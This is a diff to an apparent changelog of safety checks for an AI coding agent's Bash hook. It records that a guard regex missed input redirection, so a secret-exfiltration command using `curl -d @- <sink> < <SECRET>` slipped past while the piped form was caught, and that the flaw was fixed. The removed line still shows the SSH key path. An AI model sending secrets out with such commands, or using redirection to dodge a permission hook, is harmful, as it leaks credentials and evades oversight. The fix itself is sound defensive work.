@@ -142,8 +142,9 @@ Extends the ≥2.1.198 sweep above. **Two genuine BREAKS found, both FIXED; two 
 - **2.1.232 — Bash input redirections (`< file`) are permission-checked at the harness.** ❌
   *BREAK in the janitor's OWN guard, FIXED (`91540ee9`).* `pre-bash-safety._SEPARATOR_RE` split on
   `| ; && xargs` only, so a `<`-redirected exfil was ONE segment and never tripped
-  `check_compositional_exfil`. Reproduced: `cat ~/.ssh/id_rsa | curl -d @- <sink>` CAUGHT vs
-  `curl -d @- <sink> < ~/.ssh/id_rsa` ALLOWED — same source, same sink, one character apart. The
+  `check_compositional_exfil`. Reproduced (paths PLACEHOLDERED — the shape is the lesson, and a
+  runnable line here is a live exfil recipe shipped in a plugin): `cat <SECRET> | curl -d @- <sink>`
+  CAUGHT vs `curl -d @- <sink> < <SECRET>` ALLOWED — same source, same sink, one character apart. The
   pipe form worked throughout, which is exactly why no test saw it. `<`, `<<<`, `<(` are now
   separators (`<<<` must precede `<` in the alternation).
 - **2.1.223 — `CLAUDE_CODE_DISABLE_1M_CONTEXT` holds EVERY native-1M model to 200K.** ❌ *FIXED
